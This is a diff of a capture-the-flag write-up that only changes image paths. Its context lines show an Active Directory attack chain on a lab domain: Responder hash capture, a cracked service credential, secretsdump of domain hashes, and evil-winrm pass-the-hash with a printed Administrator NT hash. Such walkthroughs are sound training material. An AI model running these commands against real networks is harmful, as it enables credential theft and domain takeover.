@@ -54,7 +54,7 @@ Next, we start Responder on our VPN interface to listen for incoming authenticat
 
 `sudo responder -I tun0 -dwv`
 
-![](assets/svcHash.png)
+![](../assets/svcHash.png)
 After collecting the hash we want to decrypted the hash 
 
 ### Cracking the hash wit John
@@ -69,7 +69,7 @@ _Credentials_ : svc.scanner:1summerlove!
 `
 
 
-![](assets/bloodhoundproxy.png)
+![](../assets/bloodhoundproxy.png)
 
 Analysis reveals delegation rights for svc.scanner.
 **Notice:** svc.scanner AllowedToDelegate to DC01.CTF.LOCAL
@@ -94,7 +94,7 @@ Using the Kerberos ticket, we execute secretsdump.py to dump password hashes fro
 
 `impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local`
 
-![](assets/proxyhashes.png)
+![](../assets/proxyhashes.png)
 
 Administrator NT Hash: dd4592176bb3f58eea4e87a8f0eaf270
 
@@ -102,4 +102,4 @@ Finally, we establish interactive administrative access using Evil-WinRM via Pas
 
 `evil-winrm -i 10.114.170.105 -u Administrator -H dd4592176bb3f58eea4e87a8f0eaf270`
 
-![](assets/evilwinproxy.png)
+![](../assets/evilwinproxy.png)
